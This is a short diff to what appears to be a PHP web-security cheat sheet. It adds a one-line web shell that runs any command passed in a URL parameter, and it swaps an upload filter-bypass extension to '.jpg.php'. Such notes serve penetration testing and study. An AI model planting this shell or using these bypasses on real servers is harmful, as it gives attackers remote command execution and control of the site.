@@ -1,5 +1,12 @@
 ## PHP
 
+- **Run commands**
+  ```php
+  <?php
+    echo system($_GET['c']);
+  ?>
+  ```
+  
 - `preg_replace`
 
   - Local File Inclusion bug.
@@ -39,8 +46,7 @@
 ### File extension bypass
 
   - `.php5`
-  - `.php.pdf`
-
+  - `.jpg.php`
 
 ### Codeigniter
 
